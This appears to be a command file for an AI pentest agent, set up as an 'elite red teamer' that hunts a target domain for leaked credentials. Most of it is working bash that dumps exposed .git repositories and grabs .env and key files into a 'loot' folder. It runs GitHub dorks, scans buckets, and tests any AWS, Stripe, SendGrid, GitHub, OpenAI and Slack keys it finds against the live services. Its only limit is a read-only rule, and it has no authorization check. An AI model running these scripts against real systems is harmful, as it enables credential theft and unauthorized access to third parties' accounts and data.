---
description: Leaked secrets & API key hunter — exposed .git, .env, backup files, GitHub dorking, trufflehog, API key validation (AWS, Stripe, GCP, Twilio, SendGrid, GitHub, OpenAI)
argument-hint: <target-domain-or-base-url>
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-secrets — Leaked Secrets & Credential Hunter

You are an elite red teamer hunting for exposed credentials, API keys, and source code. Real attackers check these before doing anything else — a leaked AWS key or exposed .git repository is often full compromise in minutes. Execute each phase and **validate every found key**.

**Critical mindset**: Finding a valid AWS key → `sts get-caller-identity` first (non-destructive) → if it works, you have cloud access. That single finding outweighs weeks of application testing.

---

## Step 0 — Setup & Context

```bash
# Parse $ARGUMENTS: target domain or base URL
TARGET_RAW=<arguments>
# Normalize: strip protocol, trailing slash
TARGET=$(echo $TARGET_RAW | sed 's|https\?://||; s|/.*||')
BASE_URL="https://$TARGET"
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)
RECON=$ENG/recon
mkdir -p $ENG/loot/secrets $ENG/loot/git_dump $RECON/http/js

echo "=== pt-secrets: $TARGET ==="
echo "Base URL: $BASE_URL"
echo "Timestamp: $TS"
echo ""

# Tool check
echo "=== Tool Check ==="
for t in trufflehog gitleaks git-dumper curl python3 dig aws; do
    printf "  %-15s %s\n" "$t" "$(command -v $t 2>/dev/null || echo 'NOT FOUND')"
done

# Install missing tools
command -v trufflehog &>/dev/null || {
    echo "[install] Installing trufflehog..."
    curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin 2>/dev/null
}
command -v gitleaks &>/dev/null || \
    apt-get install -y gitleaks 2>/dev/null
command -v git-dumper &>/dev/null || \
    pip3 install git-dumper 2>/dev/null
echo ""
```

---

## Phase 1 — Exposed Infrastructure Files

The most impactful findings: full source code via exposed .git, plaintext credentials via .env.

```bash
TARGET=<target>; BASE_URL=https://<target>
ENG=/home/kali/current

echo "=== [Phase 1] Exposed Infrastructure Files ==="
echo ""

# Check .git directory on main target
echo "--- .git directory exposure ---"
for scheme in "https" "http"; do
    for host in "$TARGET" "www.$TARGET"; do
        STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$scheme://$host/.git/HEAD" --max-time 5)
        if [ "$STATUS" = "200" ]; then
            GIT_CONTENT=$(curl -sk "$scheme://$host/.git/HEAD" --max-time 5)
            echo "[GIT EXPOSED] $scheme://$host/.git/HEAD → $GIT_CONTENT"
            echo "Dumping repo..."
            git-dumper "$scheme://$host/.git/" $ENG/loot/git_dump/${host//./_}/ 2>/dev/null && \
                echo "[GIT DUMP COMPLETE] $ENG/loot/git_dump/${host//./_}/"
        fi
    done
done

# Check all live subdomains for exposed .git
echo ""
echo "--- Scanning live subdomains for .git ---"
[ -f $ENG/recon/http/live_hosts.txt ] && \
for sub in $(cat $ENG/recon/http/live_hosts.txt 2>/dev/null | head -50); do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$sub/.git/HEAD" --max-time 3)
    [ "$STATUS" = "200" ] && {
        echo "[GIT EXPOSED] https://$sub/.git/HEAD"
        git-dumper "https://$sub/.git/" $ENG/loot/git_dump/${sub//./_}/ 2>/dev/null
    }
done

echo ""
echo "--- Sensitive file exposure ---"
SENSITIVE_PATHS=(
    "/.env"
    "/.env.local"
    "/.env.production"
    "/.env.development"
    "/.env.staging"
    "/config.php"
    "/wp-config.php"
    "/wp-config.php.bak"
    "/.htaccess"
    "/.htpasswd"
    "/config.yml"
    "/config.yaml"
    "/database.yml"
    "/secrets.json"
    "/settings.py"
    "/local_settings.py"
    "/application.properties"
    "/application.yml"
    "/.aws/credentials"
    "/.docker/config.json"
    "/Dockerfile"
    "/docker-compose.yml"
    "/.npmrc"
    "/.pypirc"
    "/server.key"
    "/server.pem"
    "/private.key"
    "/id_rsa"
    "/id_ed25519"
    "/phpinfo.php"
    "/info.php"
    "/test.php"
    "/.svn/entries"
    "/.hg/hgrc"
    "/CVS/Root"
    "/MANIFEST"
    "/requirements.txt"
    "/composer.json"
    "/package.json"
    "/yarn.lock"
    "/Gemfile"
)

for path in "${SENSITIVE_PATHS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path" --max-time 5)
    if [ "$code" = "200" ] || [ "$code" = "403" ]; then
        echo "  [$code] $BASE_URL$path"
        if [ "$code" = "200" ]; then
            content=$(curl -sk "$BASE_URL$path" --max-time 5 | head -30)
            echo "    Content preview: $(echo "$content" | head -5)"
            # Save if it looks like credentials
            echo "$content" | grep -qiE "password|secret|key|token|api|db_|database|aws|private" && {
                echo "    [CREDENTIALS POSSIBLE — saving]"
                echo "=== $BASE_URL$path ===" >> $ENG/loot/secrets/exposed_configs.txt
                echo "$content" >> $ENG/loot/secrets/exposed_configs.txt
                echo "" >> $ENG/loot/secrets/exposed_configs.txt
            }
        fi
    fi
done
```

---

## Phase 2 — Backup & Source Map Discovery

```bash
TARGET=<target>; BASE_URL=https://<target>
ENG=/home/kali/current

echo "=== [Phase 2] Backup Files & Source Maps ==="

# Source maps (expose original unminified JS code — reveals business logic, internal paths, secrets)
echo "--- JavaScript source maps ---"
for js_file in $(find $ENG/recon/http/js/ -name "*.js" 2>/dev/null | head -20); do
    js_url=$(cat $js_file 2>/dev/null | grep "sourceMappingURL=" | grep -oE '[^ ]+$' | head -1)
    [ -n "$js_url" ] && echo "  [sourceMappingURL] $js_url — downloading..."
    curl -sk "${js_file%.js}.js.map" 2>/dev/null | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    sources = d.get('sources', [])
    print(f'  Source map: {len(sources)} original files')
    for s in sources[:10]: print(f'    {s}')
except: pass
" 2>/dev/null
done

# Backup files by naming patterns
echo ""
echo "--- Backup file discovery ---"
DOMAIN_PARTS=$(echo $TARGET | tr '.' '\n' | head -1)
BACKUP_PATTERNS=(
    "backup.zip" "backup.tar.gz" "backup.sql" "backup.tar.bz2"
    "www.zip" "web.zip" "site.zip" "htdocs.zip"
    "${DOMAIN_PARTS}.zip" "${DOMAIN_PARTS}-backup.zip"
    "${DOMAIN_PARTS}_backup.zip" "${DOMAIN_PARTS}.tar.gz"
    "db.sql" "database.sql" "dump.sql" "mysql.sql"
    "config.bak" "config.php.bak" "wp-config.php.bak"
    "web.config.bak" "app.js.bak" "index.php.bak"
    ".DS_Store" "Thumbs.db"
    "CHANGELOG" "CHANGELOG.md" "CHANGELOG.txt"
    "README.md" "TODO" "TODO.md" "INSTALL"
    "phpMyAdmin.zip" "phpmyadmin.zip"
)

for pattern in "${BACKUP_PATTERNS[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/$pattern" --max-time 5)
    [ "$code" = "200" ] && {
        size=$(curl -sk -I "$BASE_URL/$pattern" 2>/dev/null | grep -i "content-length" | awk '{print $2}' | tr -d '\r')
        echo "  [BACKUP EXPOSED] $BASE_URL/$pattern (${size:-?} bytes)"
    }
done

# .DS_Store file parsing (macOS — reveals directory structure)
echo ""
DS_CONTENT=$(curl -sk "$BASE_URL/.DS_Store" -o /tmp/ds_store_$TS.bin --max-time 5 2>/dev/null)
if [ -s /tmp/ds_store_$TS.bin ]; then
    echo "  [.DS_STORE EXPOSED] Parsing directory entries..."
    python3 -c "
import re, sys
data = open('/tmp/ds_store_$TS.bin', 'rb').read()
entries = set(re.findall(b'[\\x20-\\x7e]{4,60}', data))
valid = [e.decode('latin-1') for e in entries
         if not e.startswith(b'\\x') and b'/' not in e and len(e) > 3]
for e in sorted(valid): print(f'  {e}')
" 2>/dev/null
fi
```

---

## Phase 3 — GitHub & Code Repository Secret Scanning

```bash
TARGET=<target>; BASE_URL=https://<target>
ENG=/home/kali/current

DOMAIN_MAIN=$(echo $TARGET | rev | cut -d. -f1-2 | rev)
GITHUB_TOKEN=${GITHUB_TOKEN:-}
if [ -n "$GITHUB_TOKEN" ]; then
    AUTH="-H 'Authorization: token $GITHUB_TOKEN'"
    echo "Using GitHub token (5000 req/hr)"
else
    AUTH=""
    echo "No GITHUB_TOKEN set (60 req/hr). Set GITHUB_TOKEN in .claude.json env for better results."
fi

echo "=== [Phase 3] GitHub Secret Scanning: $DOMAIN_MAIN ==="
echo ""

# GitHub code search (7 dork queries)
DORK_QUERIES=(
    "$DOMAIN_MAIN password"
    "$DOMAIN_MAIN api_key"
    "$DOMAIN_MAIN secret"
    "$DOMAIN_MAIN AKIA"
    "$DOMAIN_MAIN BEGIN RSA PRIVATE"
    "$DOMAIN_MAIN database_url"
    "$DOMAIN_MAIN Authorization: Bearer"
    "$DOMAIN_MAIN token"
    "$DOMAIN_MAIN credentials"
    "site:$TARGET ext:env"
    "site:$TARGET ext:sql"
    "site:$TARGET ext:log"
)

for query in "${DORK_QUERIES[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$query'))" 2>/dev/null)
    result=$(curl -s "https://api.github.com/search/code?q=${encoded}&per_page=3" \
        ${GITHUB_TOKEN:+-H "Authorization: token $GITHUB_TOKEN"} \
        -H "Accept: application/vnd.github.v3+json" 2>/dev/null)
    count=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('total_count', 0))" 2>/dev/null)
    if [ "$count" -gt "0" ] 2>/dev/null; then
        echo "  [$count hits] '$query'"
        echo "$result" | python3 -c "
import json, sys
d = json.load(sys.stdin)
for item in d.get('items', [])[:3]:
    print(f'    {item[\"html_url\"]}')
" 2>/dev/null
    fi
    sleep 1  # respect rate limit
done

echo ""
echo "--- GitHub org/user enumeration (find repos) ---"
# Try to find GitHub org for target
ORG=$(echo $DOMAIN_MAIN | cut -d. -f1)
REPOS=$(curl -s "https://api.github.com/orgs/$ORG/repos?per_page=10" \
    ${GITHUB_TOKEN:+-H "Authorization: token $GITHUB_TOKEN"} 2>/dev/null | \
    python3 -c "import json,sys; [print(r['full_name']) for r in json.load(sys.stdin)[:10] if isinstance(r,dict)]" 2>/dev/null)

if [ -n "$REPOS" ]; then
    echo "  Found org: $ORG"
    echo "$REPOS"
    echo ""
    echo "  Scanning repos with trufflehog..."
    for repo in $(echo "$REPOS" | head -3); do
        echo "  [trufflehog] $repo"
        trufflehog github --repo "https://github.com/$repo" \
            --only-verified --concurrency 2 2>/dev/null | \
            grep -E "Detector|Secret|Raw" | head -20
    done
fi
```

---

## Phase 4 — trufflehog & gitleaks on Downloaded Code

```bash
ENG=/home/kali/current

echo "=== [Phase 4] Secret Scanning with trufflehog & gitleaks ==="
echo ""

# Scan all git dumps from Phase 1
for dump_dir in $ENG/loot/git_dump/*/; do
    [ -d "$dump_dir" ] || continue
    echo "--- trufflehog: $dump_dir ---"
    trufflehog filesystem "$dump_dir" --only-verified 2>/dev/null | \
        grep -E "Detector|Raw|File|Line" | head -30 | \
        tee -a $ENG/loot/secrets/trufflehog_results.txt

    echo ""
    echo "--- gitleaks: $dump_dir ---"
    gitleaks detect --source "$dump_dir" \
        --report-format json \
        --report-path $ENG/loot/secrets/gitleaks_$(basename $dump_dir).json \
        --no-git 2>/dev/null
    cat $ENG/loot/secrets/gitleaks_$(basename $dump_dir).json 2>/dev/null | \
        python3 -c "
import json, sys
try:
    findings = json.load(sys.stdin)
    for f in findings[:10]:
        print(f'  [{f.get(\"RuleID\",\"?\")}] {f.get(\"File\",\"?\")}:{f.get(\"StartLine\",\"?\")}')
        print(f'  Secret: {f.get(\"Secret\",\"?\")[:60]}')
except: pass
" 2>/dev/null
done

# Scan JS files from recon
if [ -d "$ENG/recon/http/js" ] && [ -n "$(ls $ENG/recon/http/js/ 2>/dev/null)" ]; then
    echo ""
    echo "--- trufflehog on JS files ---"
    trufflehog filesystem $ENG/recon/http/js/ 2>/dev/null | \
        grep -E "Detector|Raw|File" | head -30 | \
        tee -a $ENG/loot/secrets/trufflehog_results.txt
fi

echo ""
echo "Results: $ENG/loot/secrets/trufflehog_results.txt"
```

---

## Phase 5 — API Key Validation

**Critical**: For each found key, validate it. A validated key = confirmed impact.

```bash
ENG=/home/kali/current

echo "=== [Phase 5] API Key Validation ==="
echo "Testing each found key against its service (read-only, non-destructive)..."
echo ""

# Extract potential keys from all loot
echo "--- Extracting key candidates from loot ---"
cat $ENG/loot/secrets/exposed_configs.txt \
    $ENG/loot/secrets/trufflehog_results.txt \
    2>/dev/null | \
    grep -oE '(AKIA[A-Z0-9]{16}|sk_live_[A-Za-z0-9]{24,}|AIza[A-Za-z0-9_-]{35}|SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}|gh[ps]_[A-Za-z0-9]{36}|xoxb-[A-Za-z0-9-]+|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)' | \
    sort -u | head -20

echo ""

# AWS key validation (if AKIA key found)
FOUND_AWS_KEY=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -oE 'AKIA[A-Z0-9]{16}' | head -1)
FOUND_AWS_SECRET=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -A2 "$FOUND_AWS_KEY" | grep -oE '[A-Za-z0-9+/]{40}' | head -1)

if [ -n "$FOUND_AWS_KEY" ]; then
    echo "--- AWS Key Validation: $FOUND_AWS_KEY ---"
    AWS_ACCESS_KEY_ID="$FOUND_AWS_KEY" AWS_SECRET_ACCESS_KEY="$FOUND_AWS_SECRET" \
        aws sts get-caller-identity 2>/dev/null | python3 -m json.tool 2>/dev/null || \
        echo "[INVALID or no secret found]"
fi

# Stripe key validation
FOUND_STRIPE=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -oE 'sk_live_[A-Za-z0-9]{24,}|sk_test_[A-Za-z0-9]{24,}' | head -1)
if [ -n "$FOUND_STRIPE" ]; then
    echo ""
    echo "--- Stripe Key Validation: ${FOUND_STRIPE:0:15}... ---"
    result=$(curl -s "https://api.stripe.com/v1/charges?limit=1" -u "$FOUND_STRIPE:" 2>/dev/null)
    echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print('VALID - charges accessible' if 'data' in d else f'INVALID: {d.get(\"error\",{}).get(\"message\",\"unknown\")}')" 2>/dev/null
fi

# Google API key validation
FOUND_GOOGLE=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -oE 'AIza[A-Za-z0-9_-]{35}' | head -1)
if [ -n "$FOUND_GOOGLE" ]; then
    echo ""
    echo "--- Google API Key Validation: ${FOUND_GOOGLE:0:15}... ---"
    result=$(curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=$FOUND_GOOGLE" 2>/dev/null)
    echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); status=d.get('status',''); print(f'Status: {status} - {\"VALID KEY\" if status!=\"REQUEST_DENIED\" else \"INVALID/RESTRICTED\"}')" 2>/dev/null
fi

# SendGrid key validation
FOUND_SG=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -oE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}' | head -1)
if [ -n "$FOUND_SG" ]; then
    echo ""
    echo "--- SendGrid Key Validation: ${FOUND_SG:0:15}... ---"
    result=$(curl -s "https://api.sendgrid.com/v3/scopes" -H "Authorization: Bearer $FOUND_SG" 2>/dev/null)
    echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); scopes=d.get('scopes',[]); print(f'VALID - {len(scopes)} scopes: {scopes[:5]}' if scopes else f'INVALID: {d}')" 2>/dev/null
fi

# GitHub token validation
FOUND_GH=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -oE 'gh[ps]_[A-Za-z0-9]{36}|ghp_[A-Za-z0-9]{36}' | head -1)
if [ -n "$FOUND_GH" ]; then
    echo ""
    echo "--- GitHub Token Validation: ${FOUND_GH:0:15}... ---"
    result=$(curl -s "https://api.github.com/user" -H "Authorization: token $FOUND_GH" 2>/dev/null)
    echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'VALID - User: {d.get(\"login\")} | Email: {d.get(\"email\")} | Admin: {d.get(\"site_admin\")}' if 'login' in d else f'INVALID: {d.get(\"message\")}')" 2>/dev/null
fi

# OpenAI key validation
FOUND_OAI=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -oE 'sk-[A-Za-z0-9]{48}' | head -1)
if [ -n "$FOUND_OAI" ]; then
    echo ""
    echo "--- OpenAI Key Validation: ${FOUND_OAI:0:15}... ---"
    result=$(curl -s "https://api.openai.com/v1/models" -H "Authorization: Bearer $FOUND_OAI" 2>/dev/null)
    echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); models=d.get('data',[]); print(f'VALID - {len(models)} models accessible' if models else f'INVALID: {d.get(\"error\",{}).get(\"message\",\"unknown\")}')" 2>/dev/null
fi

# Slack token validation
FOUND_SLACK=$(cat $ENG/loot/secrets/*.txt $ENG/loot/secrets/*.json 2>/dev/null | \
    grep -oE 'xox[bprs]-[A-Za-z0-9-]+' | head -1)
if [ -n "$FOUND_SLACK" ]; then
    echo ""
    echo "--- Slack Token Validation: ${FOUND_SLACK:0:15}... ---"
    result=$(curl -s "https://slack.com/api/auth.test" -H "Authorization: Bearer $FOUND_SLACK" 2>/dev/null)
    echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'VALID - Team: {d.get(\"team\")} User: {d.get(\"user\")}' if d.get('ok') else f'INVALID: {d.get(\"error\")}')" 2>/dev/null
fi
```

---

## Phase 6 — Cloud Storage Misconfiguration

```bash
TARGET=<target>; ENG=/home/kali/current

echo "=== [Phase 6] Cloud Storage Misconfiguration ==="
DOMAIN_BASE=$(echo $TARGET | rev | cut -d. -f1-2 | rev | cut -d. -f1)
DOMAIN_DASHED=$(echo $DOMAIN_BASE | tr '.' '-')

# S3 bucket naming patterns
S3_NAMES=(
    "$DOMAIN_BASE"
    "$DOMAIN_DASHED"
    "${DOMAIN_BASE}-backup"
    "${DOMAIN_BASE}-prod"
    "${DOMAIN_BASE}-staging"
    "${DOMAIN_BASE}-dev"
    "${DOMAIN_BASE}-assets"
    "${DOMAIN_BASE}-static"
    "${DOMAIN_BASE}-media"
    "${DOMAIN_BASE}-files"
    "${DOMAIN_BASE}-uploads"
    "${DOMAIN_BASE}-logs"
    "${DOMAIN_BASE}-data"
    "${DOMAIN_BASE}-private"
    "${DOMAIN_BASE}-public"
)

echo "--- S3 Buckets ---"
for name in "${S3_NAMES[@]}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://$name.s3.amazonaws.com/" --max-time 5)
    case "$CODE" in
        200) echo "  [OPEN] s3://$name (public list access)"
             curl -sk "https://$name.s3.amazonaws.com/?list-type=2&max-keys=10" 2>/dev/null | \
                 grep -oE '<Key>[^<]+</Key>' | sed 's/<[^>]*>//g' | head -10
             ;;
        403) echo "  [EXISTS] s3://$name (403 — exists but restricted)" ;;
        301) echo "  [REDIR] s3://$name" ;;
    esac
done

echo ""
echo "--- Google Cloud Storage ---"
for name in "${S3_NAMES[@]}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/$name/" --max-time 5)
    case "$CODE" in
        200) echo "  [OPEN] gs://$name" ;;
        403) echo "  [EXISTS] gs://$name (403)" ;;
    esac
done

echo ""
echo "--- Azure Blob Storage ---"
for name in "${S3_NAMES[@]}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://$name.blob.core.windows.net/" --max-time 5)
    [ "$CODE" = "200" ] || [ "$CODE" = "400" ] && echo "  [EXISTS] Azure: $name.blob.core.windows.net → $CODE"
done
```

---

## Phase 7 — Summary & Priority Findings

```bash
ENG=/home/kali/current

echo "=== [Phase 7] Summary ==="
echo ""
echo "--- Critical Findings ---"
grep -i "\[GIT EXPOSED\]\|\[VALID\]\|\[OPEN\]" $ENG/loot/secrets/*.txt 2>/dev/null | head -20
echo ""
echo "--- All loot files ---"
ls -la $ENG/loot/secrets/ 2>/dev/null
echo ""
echo "=== ATTACK SURFACE PRIORITY ==="
echo "1. VALIDATED API KEYS → immediate cloud/service access"
echo "2. GIT EXPOSED + dumped → full source code, history, all secrets"
echo "3. .ENV / CONFIG EXPOSED → database creds, service keys, internal URLs"
echo "4. OPEN CLOUD BUCKET → data exfiltration, potential write access"
echo "5. SOURCE MAPS → business logic review, hidden endpoints"
echo ""

# Document in engagement.md
cat >> $ENG/notes/engagement.md << 'EOF'

## Secrets Hunt Results
[Claude: fill in all validated findings, key types confirmed, git repos dumped]

EOF
echo "Added placeholder to engagement.md"
```

---

## Execution Rules

- **Validate every found key** — "found a key" is not a finding; "found a valid AWS key with S3 read access" is Critical
- **AWS STS first** — `aws sts get-caller-identity` is non-destructive, non-alerting, and definitively confirms access
- **Never use found keys to modify data** — read-only validation only (list, get, describe — never create/delete/update)
- **Save all findings immediately** to `$ENG/loot/secrets/` — even unvalidated, they persist across sessions
- **GitHub search is passive** — safe to run, rate-limited at 60 req/hr unauthenticated
- **trufflehog --only-verified** flag: only shows secrets with confirmed live service access — zero false positives
- **Source maps are often ignored** — check every .js.map URL, unminified source often contains hardcoded keys
- **Chain to pt-recon**: if .git is found and dumped, feed the extracted secrets to this skill for validation
